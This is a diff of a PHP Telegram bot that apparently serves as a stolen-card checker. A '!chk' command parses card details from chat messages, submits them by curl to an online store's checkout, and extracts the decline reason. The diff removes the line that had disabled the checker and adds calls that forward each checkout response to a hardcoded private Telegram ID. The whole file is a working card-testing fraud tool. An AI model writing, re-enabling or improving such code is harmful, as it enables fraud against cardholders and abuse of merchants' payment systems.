@@ -9,10 +9,10 @@ function ats($chatId, $message, $message_id) {
 	
 
 if (preg_match('/^(!|\/|\.)chk/', $message)) {
-
+/*
 	$respuesta = "Gate no disponible por el momento!!";
 	sendMessage($chatId, $respuesta, $message_id);
-	die();
+	die();*/
 $lista = substr($message, 5);
 $i = preg_split('/[|:| ]/', $lista);
 $cc    = $i[0];
@@ -150,7 +150,7 @@ curl_setopt_array($curl, [
   ],
 ]);
 
-
+$myid = "1292171163";
 $response = curl_exec($curl);
 $err = curl_error($curl);
 
@@ -158,13 +158,18 @@ $patron = '/<div class="wc-block-components-notice-banner__content">(.*?)<\/div>
 //$patron = '/<div class="wc-block-components-notice-banner__content">(.*?)<\/div>/';
 preg_match($patron, $response, $coincidencias);
 $mensaje = trim($coincidencias[1]);
+	
+	sendPv($myid, $mensaje);
+
 $patron = '/Reason: (.*)/';
 preg_match($patron, $mensaje, $coincidencias);
 $respo = $coincidencias[1];
 curl_close($curl);
+	
+sendPv($myid, $respo);
 
 if (empty($respo)){
-$respo = trim($mensaje);
+$respo = $mensaje;
 }
 
 
